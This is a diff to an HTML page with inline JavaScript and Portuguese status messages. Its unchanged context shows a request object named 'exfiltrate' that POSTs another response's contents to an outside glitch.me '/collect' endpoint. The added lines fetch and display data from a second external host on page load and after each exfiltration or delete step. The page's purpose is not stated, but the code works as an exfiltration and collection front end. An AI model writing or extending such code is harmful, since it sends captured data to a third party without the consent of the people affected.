@@ -57,6 +57,11 @@
                         var exfiltrate = new XMLHttpRequest();
                         exfiltrate.open('POST', 'https://cyclic-magical-ankle.glitch.me/collect', true);
                         exfiltrate.setRequestHeader('Content-Type', 'application/json');
+                        exfiltrate.onreadystatechange = function() {
+                            if (exfiltrate.readyState == 4 && exfiltrate.status == 200) {
+                                updateData();
+                            }
+                        };
                         exfiltrate.send(JSON.stringify({data: xhr.responseText}));
                     } else {
                         statusDiv.innerHTML = 'Status: Falha ao obter dados. Código de status: ' + xhr.status;
@@ -87,6 +92,7 @@
                         statusDiv.innerHTML = 'Status: Dados apagados com sucesso!';
                         statusDiv.style.borderColor = 'blue';
                         statusDiv.style.backgroundColor = '#e0f7ff';
+                        updateData();
                     } else {
                         statusDiv.innerHTML = 'Status: Falha ao apagar dados. Código de status: ' + xhr.status;
                         statusDiv.style.borderColor = 'red';
@@ -103,6 +109,23 @@
             };
             xhr.send();
         }
+
+        function updateData() {
+            var xhr = new XMLHttpRequest();
+            xhr.open('GET', 'https://potent-intriguing-dichondra.glitch.me/data', true);
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState == 4 && xhr.status == 200) {
+                    var statusDiv = document.getElementById('status');
+                    console.log('Update Data XHR Status:', xhr.status);
+                    console.log('Update Data XHR Response:', xhr.responseText);
+                    statusDiv.innerHTML = 'Dados atuais: ' + xhr.responseText;
+                }
+            };
+            xhr.send();
+        }
+
+        // Atualizar dados ao carregar a página
+        window.onload = updateData;
     </script>
 </body>
 </html>
